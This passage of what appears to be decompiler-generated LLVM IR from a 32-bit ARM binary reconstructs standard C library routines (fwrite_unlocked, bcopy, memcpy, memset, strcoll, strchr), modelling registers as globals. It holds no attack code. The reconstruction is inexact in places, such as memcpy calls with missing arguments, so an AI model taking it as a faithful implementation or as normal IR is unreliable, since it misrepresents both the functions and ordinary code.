  %v14_15650 = phi i32 [ %v6_15644, %entry ], [ -1, %bb ]
  %v2_15650 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15650, i32* @r4, align 4
  store i32 %v6_15620, i32* @r5, align 4
  store i32 %v9_15620, i32* @r6, align 4
  ret i32 %v14_15650

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15654 = load i32, i32* @r6, align 4
  %v12_15654 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1565c = load i8, i8* %arg4, align 1
  %v4_1565c = zext i8 %v3_1565c to i32
  %v1_15660 = and i32 %v4_1565c, 192
  store i32 %v1_15660, i32* %r3.global-to-local, align 4
  %v2_15664 = icmp eq i32 %v1_15660, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15664, label %dec_label_pc_1568c, label %dec_label_pc_15680

dec_label_pc_15680:                               ; preds = %entry
  %v4_15680 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_15684 = icmp eq i32 %v4_15680, 0
  br i1 %v2_15684, label %dec_label_pc_15680.dec_label_pc_1568c_crit_edge, label %dec_label_pc_156f4

dec_label_pc_15680.dec_label_pc_1568c_crit_edge:  ; preds = %dec_label_pc_15680
  %v0_1568c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1568c

dec_label_pc_1568c:                               ; preds = %dec_label_pc_15680.dec_label_pc_1568c_crit_edge, %entry
  %v0_156941 = phi i32 [ %v0_1568c.pre, %dec_label_pc_15680.dec_label_pc_1568c_crit_edge ], [ %arg2, %entry ]
  %v2_1568c = icmp eq i32 %v0_156941, 0
  br i1 %v2_1568c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1568c
  br label %dec_label_pc_156f4

bb:                                               ; preds = %dec_label_pc_1568c
  %v1_15690 = load i32, i32* @r6, align 4
  %v3_15690 = icmp eq i32 %v1_15690, 0
  br i1 %v3_15690, label %dec_label_pc_156f4, label %dec_label_pc_156a0

dec_label_pc_156a0:                               ; preds = %bb
  %v2_156a0 = udiv i32 -1, %v0_156941
  %v0_156a8 = load i32, i32* @r4, align 4
  store i32 %v0_156a8, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_15690, %v2_156a0
  br i1 %tmp10, label %dec_label_pc_156cc, label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_156a0
  %v0_156ac = load i32, i32* @r7, align 4
  %v2_156b4 = mul i32 %v1_15690, %v0_156941
  %v4_156b8 = call i32 @__stdio_fwrite(i32 %v0_156ac, i32 %v2_156b4, i32 %v0_156a8)
  %v0_156bc = load i32, i32* @r5, align 4
  %v2_156c0 = udiv i32 %v4_156b8, %v0_156bc
  store i32 %v2_156c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156f8

dec_label_pc_156cc:                               ; preds = %dec_label_pc_156a0
  %v1_156cc = inttoptr i32 %v0_156a8 to i32*
  %v2_156cc = load i32, i32* %v1_156cc, align 4
  %v1_156d0 = or i32 %v2_156cc, 8
  store i32 %v1_156d0, i32* %r3.global-to-local, align 4
  %v3_156d4 = sdiv i32 %v2_156cc, 256
  store i32 %v3_156d4, i32* %r2.global-to-local, align 4
  %v1_156d8 = trunc i32 %v3_156d4 to i8
  %v3_156d8 = add i32 %v0_156a8, 1
  %v4_156d8 = inttoptr i32 %v3_156d8 to i8*
  store i8 %v1_156d8, i8* %v4_156d8, align 1
  %v0_156dc = load i32, i32* %r3.global-to-local, align 4
  %v1_156dc = trunc i32 %v0_156dc to i8
  %v2_156dc = load i32, i32* @r4, align 4
  %v3_156dc = inttoptr i32 %v2_156dc to i8*
  store i8 %v1_156dc, i8* %v3_156dc, align 1
  %v0_156e0 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_156ec = inttoptr i32 %v0_156e0 to i32*
  store i32 22, i32* %v2_156ec, align 4
  %v0_156f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156f8

dec_label_pc_156f4:                               ; preds = %.thread, %dec_label_pc_15680, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156cc, %dec_label_pc_156b4, %dec_label_pc_156f4
  %v0_156f8 = phi i32 [ %v0_156f8.pre, %dec_label_pc_156cc ], [ %v2_156c0, %dec_label_pc_156b4 ], [ 0, %dec_label_pc_156f4 ]
  store i32 %v9_15654, i32* @r6, align 4
  store i32 %v12_15654, i32* @r7, align 4
  ret i32 %v0_156f8

; uselistorder directives
  uselistorder i32 %v3_156d4, { 1, 0 }
  uselistorder i32 %v1_15690, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_156f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156f4, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1570c = inttoptr i32 %arg2 to i8*
  %v3_1570c = call i32 @_memcpy(i8* %v2_1570c, i32 %arg1)
  ret i32 %v3_1570c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15710 = load i32, i32* @r0, align 4
  %v1_15710 = load i32, i32* @r1, align 4
  %v2_15710 = inttoptr i32 %v0_15710 to i8*
  %v3_15710 = call i32 @_memcpy(i8* %v2_15710, i32 %v1_15710)
  ret i32 %v3_15710
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_15724 = load i32, i32* @r2, align 4
  %v8_15724 = icmp eq i32 %v0_15724, 8
  store i1 %v8_15724, i1* %cpsr_z.global-to-local, align 1
  %v5_15728 = icmp slt i32 %v0_15724, 8
  br i1 %v5_15728, label %dec_label_pc_15788, label %dec_label_pc_1572c

dec_label_pc_1572c:                               ; preds = %entry
  %v4_1572c = mul i32 %arg2, 256
  %v5_1572c = or i32 %v4_1572c, %arg2
  %v4_15730 = mul i32 %v5_1572c, 65536
  %v5_15730 = or i32 %v4_15730, %v5_1572c
  store i32 %v5_15730, i32* %r1.global-to-local, align 4
  %v1_1573457 = urem i32 %tmp, 4
  %v2_1573458 = icmp eq i32 %v1_1573457, 0
  store i1 %v2_1573458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1573458, label %dec_label_pc_15744, label %bb

bb:                                               ; preds = %dec_label_pc_1572c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1572c ]
  %v3_1573859 = phi i32 [ %v6_15738, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1572c ]
  %v4_15738 = inttoptr i32 %v3_1573859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15738, align 1
  %v5_15738 = load i32, i32* %r3.global-to-local, align 4
  %v6_15738 = add i32 %v5_15738, 1
  store i32 %v6_15738, i32* %r3.global-to-local, align 4
  %v0_1573c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15748.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1573c.pr, label %dec_label_pc_15744, label %.thread

.thread:                                          ; preds = %bb
  %v2_1573c = add i32 %v0_15748.pr.pre, -1
  store i32 %v2_1573c, i32* @r2, align 4
  %v1_15734 = urem i32 %v6_15738, 4
  %v2_15734 = icmp eq i32 %v1_15734, 0
  store i1 %v2_15734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15734, label %dec_label_pc_15744, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15738.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15738.pre to i8
  br label %bb

dec_label_pc_15744:                               ; preds = %.thread, %bb, %dec_label_pc_1572c
  %v0_1575028 = phi i32 [ %tmp, %dec_label_pc_1572c ], [ %v6_15738, %bb ], [ %v6_15738, %.thread ]
  %v0_15748.pr = phi i32 [ %v0_15724, %dec_label_pc_1572c ], [ %v0_15748.pr.pre, %bb ], [ %v2_1573c, %.thread ]
  %v0_15744 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15744, i32* @ip, align 4
  %v8_1574810 = icmp eq i32 %v0_15748.pr, 8
  store i1 %v8_1574810, i1* %cpsr_z.global-to-local, align 1
  %v5_1574c11 = icmp slt i32 %v0_15748.pr, 8
  br i1 %v5_1574c11, label %dec_label_pc_15788, label %dec_label_pc_15750.preheader

dec_label_pc_15750.preheader:                     ; preds = %dec_label_pc_15744
  %v1_1575046 = inttoptr i32 %v0_1575028 to i32*
  store i32 %v0_15744, i32* %v1_1575046, align 4
  %v3_1575047 = add i32 %v0_1575028, 4
  %v4_1575048 = inttoptr i32 %v3_1575047 to i32*
  %v5_1575049 = load i32, i32* @ip, align 4
  store i32 %v5_1575049, i32* %v4_1575048, align 4
  %v6_1575050 = add i32 %v0_1575028, 8
  store i32 %v6_1575050, i32* %r3.global-to-local, align 4
  %v0_1575451 = load i32, i32* @r2, align 4
  %v1_1575452 = add i32 %v0_1575451, -8
  store i32 %v1_1575452, i32* %r2.global-to-local, align 4
  %v5_1575c53 = icmp slt i32 %v1_1575452, 8
  br i1 %v5_1575c53, label %dec_label_pc_15750.dec_label_pc_15788.loopexit_crit_edge, label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15750.preheader, %dec_label_pc_15748.dec_label_pc_15750_crit_edge
  %v6_1575055 = phi i32 [ %v6_15750, %dec_label_pc_15748.dec_label_pc_15750_crit_edge ], [ %v6_1575050, %dec_label_pc_15750.preheader ]
  %v0_1575054 = phi i32 [ %v12_1577c, %dec_label_pc_15748.dec_label_pc_15750_crit_edge ], [ %v0_1575028, %dec_label_pc_15750.preheader ]
  %v1_15760 = inttoptr i32 %v6_1575055 to i32*
  %v2_15760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15760, i32* %v1_15760, align 4
  %v3_15760 = add i32 %v0_1575054, 12
  %v4_15760 = inttoptr i32 %v3_15760 to i32*
  %v5_15760 = load i32, i32* @ip, align 4
  store i32 %v5_15760, i32* %v4_15760, align 4
  %v6_15760 = add i32 %v0_1575054, 16
  store i32 %v6_15760, i32* %r3.global-to-local, align 4
  %v0_15764 = load i32, i32* %r2.global-to-local, align 4
  %v1_15764 = add i32 %v0_15764, -8
  store i32 %v1_15764, i32* %r2.global-to-local, align 4
  %v5_1576c = icmp slt i32 %v1_15764, 8
  br i1 %v5_1576c, label %dec_label_pc_15760.dec_label_pc_15788.loopexit_crit_edge, label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %dec_label_pc_15760
  %v1_15770 = inttoptr i32 %v6_15760 to i32*
  %v2_15770 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15770, i32* %v1_15770, align 4
  %v3_15770 = add i32 %v0_1575054, 20
  %v4_15770 = inttoptr i32 %v3_15770 to i32*
  %v5_15770 = load i32, i32* @ip, align 4
  store i32 %v5_15770, i32* %v4_15770, align 4
  %v6_15770 = add i32 %v0_1575054, 24
  store i32 %v6_15770, i32* %r3.global-to-local, align 4
  %v0_15774 = load i32, i32* %r2.global-to-local, align 4
  %v1_15774 = add i32 %v0_15774, -8
  store i32 %v1_15774, i32* %r2.global-to-local, align 4
  %v5_1577c = icmp slt i32 %v1_15774, 8
  br i1 %v5_1577c, label %dec_label_pc_15770.dec_label_pc_15788.loopexit_crit_edge, label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15770
  %v7_1577c = inttoptr i32 %v6_15770 to i32*
  %v8_1577c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1577c, i32* %v7_1577c, align 4
  %v9_1577c = add i32 %v0_1575054, 28
  %v10_1577c = inttoptr i32 %v9_1577c to i32*
  %v11_1577c = load i32, i32* @ip, align 4
  store i32 %v11_1577c, i32* %v10_1577c, align 4
  %v12_1577c = add i32 %v0_1575054, 32
  store i32 %v12_1577c, i32* %r3.global-to-local, align 4
  %v6_15780 = load i32, i32* %r2.global-to-local, align 4
  %v7_15780 = add i32 %v6_15780, -8
  store i32 %v7_15780, i32* %r2.global-to-local, align 4
  %v5_1574c = icmp slt i32 %v7_15780, 8
  br i1 %v5_1574c, label %dec_label_pc_15748.dec_label_pc_15788.loopexit_crit_edge, label %dec_label_pc_15748.dec_label_pc_15750_crit_edge

dec_label_pc_15748.dec_label_pc_15750_crit_edge:  ; preds = %dec_label_pc_15748
  %v2_15750.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15750 = inttoptr i32 %v12_1577c to i32*
  store i32 %v2_15750.pre, i32* %v1_15750, align 4
  %v3_15750 = add i32 %v0_1575054, 36
  %v4_15750 = inttoptr i32 %v3_15750 to i32*
  %v5_15750 = load i32, i32* @ip, align 4
  store i32 %v5_15750, i32* %v4_15750, align 4
  %v6_15750 = add i32 %v0_1575054, 40
  store i32 %v6_15750, i32* %r3.global-to-local, align 4
  %v0_15754 = load i32, i32* %r2.global-to-local, align 4
  %v1_15754 = add i32 %v0_15754, -8
  store i32 %v1_15754, i32* %r2.global-to-local, align 4
  %v5_1575c = icmp slt i32 %v1_15754, 8
  br i1 %v5_1575c, label %dec_label_pc_15750.dec_label_pc_15788.loopexit_crit_edge, label %dec_label_pc_15760

dec_label_pc_15750.dec_label_pc_15788.loopexit_crit_edge: ; preds = %dec_label_pc_15748.dec_label_pc_15750_crit_edge, %dec_label_pc_15750.preheader
  %v1_15754.lcssa = phi i32 [ %v1_1575452, %dec_label_pc_15750.preheader ], [ %v1_15754, %dec_label_pc_15748.dec_label_pc_15750_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15788

dec_label_pc_15748.dec_label_pc_15788.loopexit_crit_edge: ; preds = %dec_label_pc_15748
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15788

dec_label_pc_15760.dec_label_pc_15788.loopexit_crit_edge: ; preds = %dec_label_pc_15760
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15788

dec_label_pc_15770.dec_label_pc_15788.loopexit_crit_edge: ; preds = %dec_label_pc_15770
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %dec_label_pc_15744, %dec_label_pc_15750.dec_label_pc_15788.loopexit_crit_edge, %dec_label_pc_15748.dec_label_pc_15788.loopexit_crit_edge, %dec_label_pc_15760.dec_label_pc_15788.loopexit_crit_edge, %dec_label_pc_15770.dec_label_pc_15788.loopexit_crit_edge, %entry
  %v0_15790 = phi i32 [ %v0_15724, %entry ], [ %v1_15774, %dec_label_pc_15770.dec_label_pc_15788.loopexit_crit_edge ], [ %v1_15764, %dec_label_pc_15760.dec_label_pc_15788.loopexit_crit_edge ], [ %v7_15780, %dec_label_pc_15748.dec_label_pc_15788.loopexit_crit_edge ], [ %v1_15754.lcssa, %dec_label_pc_15750.dec_label_pc_15788.loopexit_crit_edge ], [ %v0_15748.pr, %dec_label_pc_15744 ]
  %v2_15788 = icmp eq i32 %v0_15790, 0
  store i1 %v2_15788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15788, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15788
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15788
  %v1_15790 = sub i32 7, %v0_15790
  store i32 %v1_15790, i32* %r2.global-to-local, align 4
  %v3_15794 = mul i32 %v1_15790, 4
  %v4_15794 = add i32 %v3_15794, ptrtoint (i32* @global_var_1579c.1370 to i32)
  call void @__pseudo_branch(i32 %v4_15794)
  %v0_1579c = load i32, i32* %r1.global-to-local, align 4
  %v1_1579c = trunc i32 %v0_1579c to i8
  %v2_1579c = load i32, i32* %r3.global-to-local, align 4
  %v3_1579c = inttoptr i32 %v2_1579c to i8*
  store i8 %v1_1579c, i8* %v3_1579c, align 1
  %v4_1579c = load i32, i32* %r3.global-to-local, align 4
  %v5_1579c = add i32 %v4_1579c, 1
  store i32 %v5_1579c, i32* %r3.global-to-local, align 4
  %v0_157a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a0 = trunc i32 %v0_157a0 to i8
  %v3_157a0 = inttoptr i32 %v5_1579c to i8*
  store i8 %v1_157a0, i8* %v3_157a0, align 1
  %v4_157a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a0 = add i32 %v4_157a0, 1
  store i32 %v5_157a0, i32* %r3.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a4 = trunc i32 %v0_157a4 to i8
  %v3_157a4 = inttoptr i32 %v5_157a0 to i8*
  store i8 %v1_157a4, i8* %v3_157a4, align 1
  %v4_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a4 = add i32 %v4_157a4, 1
  store i32 %v5_157a4, i32* %r3.global-to-local, align 4
  %v0_157a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a8 = trunc i32 %v0_157a8 to i8
  %v3_157a8 = inttoptr i32 %v5_157a4 to i8*
  store i8 %v1_157a8, i8* %v3_157a8, align 1
  %v4_157a8 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a8 = add i32 %v4_157a8, 1
  store i32 %v5_157a8, i32* %r3.global-to-local, align 4
  %v0_157ac = load i32, i32* %r1.global-to-local, align 4
  %v1_157ac = trunc i32 %v0_157ac to i8
  %v3_157ac = inttoptr i32 %v5_157a8 to i8*
  store i8 %v1_157ac, i8* %v3_157ac, align 1
  %v4_157ac = load i32, i32* %r3.global-to-local, align 4
  %v5_157ac = add i32 %v4_157ac, 1
  store i32 %v5_157ac, i32* %r3.global-to-local, align 4
  %v0_157b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_157b0 = trunc i32 %v0_157b0 to i8
  %v3_157b0 = inttoptr i32 %v5_157ac to i8*
  store i8 %v1_157b0, i8* %v3_157b0, align 1
  %v4_157b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_157b0 = add i32 %v4_157b0, 1
  store i32 %v5_157b0, i32* %r3.global-to-local, align 4
  %v0_157b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157b4 = trunc i32 %v0_157b4 to i8
  %v3_157b4 = inttoptr i32 %v5_157b0 to i8*
  store i8 %v1_157b4, i8* %v3_157b4, align 1
  %v4_157b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_157b4 = add i32 %v4_157b4, 1
  store i32 %v5_157b4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15750, { 1, 0 }
  uselistorder i32 %v12_1577c, { 1, 2, 0 }
  uselistorder i32 %v0_1575054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15748.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15738, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1572c, { 1, 0 }
  uselistorder i32 %v0_15724, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 7, 6, 5, 9, 2, 8, 1, 10, 11, 13, 12, 3, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15788, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15760, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_157c4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_157c4 = phi i32 [ %v0_157c4.pre, %bb ], [ %v5_157c4, %bb3 ]
  %v0_157c0 = phi i32 [ %tmp, %bb ], [ %v5_157c0, %bb3 ]
  %v1_157c0 = inttoptr i32 %v0_157c0 to i8*
  %v2_157c0 = load i8, i8* %v1_157c0, align 1
  %v3_157c0 = zext i8 %v2_157c0 to i32
  store i32 %v3_157c0, i32* @r2, align 4
  %v1_157c4 = inttoptr i32 %v0_157c4 to i8*
  %v2_157c4 = load i8, i8* %v1_157c4, align 1
  %v3_157c4 = zext i8 %v2_157c4 to i32
  %v2_157c8 = icmp eq i8 %v2_157c0, 0
  br i1 %v2_157c8, label %.dec_label_pc_157d4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_157c4 = add i32 %v0_157c4, 1
  %v5_157c0 = add i32 %v0_157c0, 1
  %v10_157cc = icmp eq i8 %v2_157c0, %v2_157c4
  br i1 %v10_157cc, label %entry, label %dec_label_pc_157d4

.dec_label_pc_157d4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_157d4

dec_label_pc_157d4:                               ; preds = %bb3, %.dec_label_pc_157d4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_157d4_crit_edge ], [ %v3_157c0, %bb3 ]
  %v2_157d4.pre-phi = sub nsw i32 %.pn, %v3_157c4
  ret i32 %v2_157d4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_157c0, { 1, 0 }
  uselistorder i32 %v0_157c4, { 1, 0 }
  uselistorder label %dec_label_pc_157d4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_15840 = load i32, i32* @r5, align 4
  %v9_15840 = load i32, i32* @r6, align 4
  %v1_15844 = urem i32 %arg1, 256
  br label %dec_label_pc_15864

dec_label_pc_1584c:                               ; preds = %dec_label_pc_15864
  %v3_1584c = load i8, i8* %.0, align 1
  %v4_1584c = zext i8 %v3_1584c to i32
  %v9_15850 = icmp eq i32 %v4_1584c, %v1_15844
  br i1 %v9_15850, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1584c
  ret i32 %v1_15864

bb24:                                             ; preds = %dec_label_pc_1584c
  %v2_15858 = icmp eq i8 %v3_1584c, 0
  %v2_1585c = add i32 %v1_15864, 1
  %v3_1585c = inttoptr i32 %v2_1585c to i8*
  br i1 %v2_15858, label %dec_label_pc_15938, label %dec_label_pc_15864

dec_label_pc_15864:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1585c, %bb24 ]
  %v1_15864 = ptrtoint i8* %.0 to i32
  %v2_15864 = urem i32 %v1_15864, 4
  %v3_15864 = icmp eq i32 %v2_15864, 0
  br i1 %v3_15864, label %dec_label_pc_1586c, label %dec_label_pc_1584c

dec_label_pc_1586c:                               ; preds = %dec_label_pc_15864
  %v4_1586c = mul nuw nsw i32 %v1_15844, 256
  %v5_1586c = or i32 %v4_1586c, %v1_15844
  %v4_15874 = mul i32 %v5_1586c, 65536
  %v5_15874 = or i32 %v4_15874, %v5_1586c
  br label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_15930, %dec_label_pc_158b8, %dec_label_pc_1586c
  %v0_158dc = phi i32 [ %v1_15864, %dec_label_pc_1586c ], [ %v4_15878, %dec_label_pc_158b8 ], [ %v4_15878, %dec_label_pc_15930 ]
  %v1_15878 = inttoptr i32 %v0_158dc to i32*
  %v2_15878 = load i32, i32* %v1_15878, align 4
  %v4_15878 = add i32 %v0_158dc, 4
  %v2_15880 = xor i32 %v2_15878, %v5_15874
  %v2_1588c = add i32 %v2_15878, 2130640639
  %v1_15890 = sub i32 -1, %v2_15878
  %v2_15894 = xor i32 %v2_1588c, %v1_15890
  %v2_15898 = add i32 %v2_15880, 2130640639
  %v1_158a0 = sub i32 -1, %v2_15880
  %v2_158a4 = and i32 %v2_15894, -2130640640
  %v2_158a8 = xor i32 %v2_15898, %v1_158a0
  %v2_158ac = icmp eq i32 %v2_158a4, 0
  %v2_158b0 = and i32 %v2_158a8, -2130640640
  store i32 %v2_158b0, i32* @lr, align 4
  br i1 %v2_158ac, label %dec_label_pc_158b8, label %dec_label_pc_158c0

dec_label_pc_158b8:                               ; preds = %dec_label_pc_15878
  %v2_158b8 = icmp eq i32 %v2_158b0, 0
  br i1 %v2_158b8, label %dec_label_pc_15878, label %dec_label_pc_158c0

dec_label_pc_158c0:                               ; preds = %dec_label_pc_15878, %dec_label_pc_158b8
  %v2_158c0 = inttoptr i32 %v0_158dc to i8*
  %v3_158c0 = load i8, i8* %v2_158c0, align 1
  %v4_158c0 = zext i8 %v3_158c0 to i32
  %v1_158c8 = add i32 %v0_158dc, 1
  %v1_158cc = add i32 %v0_158dc, 2
  %v9_158d0 = icmp eq i32 %v4_158c0, %v1_15844
  %v1_158d4 = add i32 %v0_158dc, 3
  store i32 %v1_158d4, i32* @ip, align 4
  br i1 %v9_158d0, label %dec_label_pc_158dc, label %dec_label_pc_158e4

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158c0
  store i32 %v6_15840, i32* @r5, align 4
  store i32 %v9_15840, i32* @r6, align 4
  ret i32 %v0_158dc

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158c0
  %v2_158e4 = icmp eq i8 %v3_158c0, 0
  br i1 %v2_158e4, label %dec_label_pc_15938, label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158e4
  %v2_158ec = inttoptr i32 %v1_158c8 to i8*
  %v3_158ec = load i8, i8* %v2_158ec, align 1
  %v4_158ec = zext i8 %v3_158ec to i32
  %v9_158f0 = icmp eq i32 %v4_158ec, %v1_15844
  br i1 %v9_158f0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_158ec
  store i32 %v6_15840, i32* @r5, align 4
  store i32 %v9_15840, i32* @r6, align 4
  ret i32 %v1_158c8

bb26:                                             ; preds = %dec_label_pc_158ec
  %v2_158f8 = icmp eq i8 %v3_158ec, 0
  br i1 %v2_158f8, label %dec_label_pc_15938, label %dec_label_pc_15900

dec_label_pc_15900:                               ; preds = %bb26
  %v2_15900 = inttoptr i32 %v1_158cc to i8*
  %v3_15900 = load i8, i8* %v2_15900, align 1
  %v4_15900 = zext i8 %v3_15900 to i32
  %v9_15904 = icmp eq i32 %v4_15900, %v1_15844
  br i1 %v9_15904, label %dec_label_pc_1590c, label %dec_label_pc_15914

dec_label_pc_1590c:                               ; preds = %dec_label_pc_15900
  store i32 %v6_15840, i32* @r5, align 4
  store i32 %v9_15840, i32* @r6, align 4
  ret i32 %v1_158cc

dec_label_pc_15914:                               ; preds = %dec_label_pc_15900
  %v2_15914 = icmp eq i8 %v3_15900, 0
  br i1 %v2_15914, label %dec_label_pc_15938, label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %dec_label_pc_15914
  %v2_1591c = inttoptr i32 %v1_158d4 to i8*
  %v3_1591c = load i8, i8* %v2_1591c, align 1
  %v4_1591c = zext i8 %v3_1591c to i32
  %v9_15920 = icmp eq i32 %v4_1591c, %v1_15844
  br i1 %v9_15920, label %dec_label_pc_15928, label %dec_label_pc_15930

dec_label_pc_15928:                               ; preds = %dec_label_pc_1591c
  store i32 %v6_15840, i32* @r5, align 4
  store i32 %v9_15840, i32* @r6, align 4
  ret i32 %v1_158d4

dec_label_pc_15930:                               ; preds = %dec_label_pc_1591c
  %v2_15930 = icmp eq i8 %v3_1591c, 0
  br i1 %v2_15930, label %dec_label_pc_15938, label %dec_label_pc_15878

dec_label_pc_15938:                               ; preds = %bb24, %dec_label_pc_15930, %dec_label_pc_15914, %bb26, %dec_label_pc_158e4
  store i32 %v6_15840, i32* @r5, align 4
  store i32 %v9_15840, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_15878, { 1, 0 }
  uselistorder i32 %v2_15878, { 0, 2, 1 }
  uselistorder i32 %v0_158dc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1586c, { 1, 0 }
  uselistorder i32 %v1_15864, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_15844, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_15840, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_15840, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_15938, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_158c0, { 1, 0 }
}

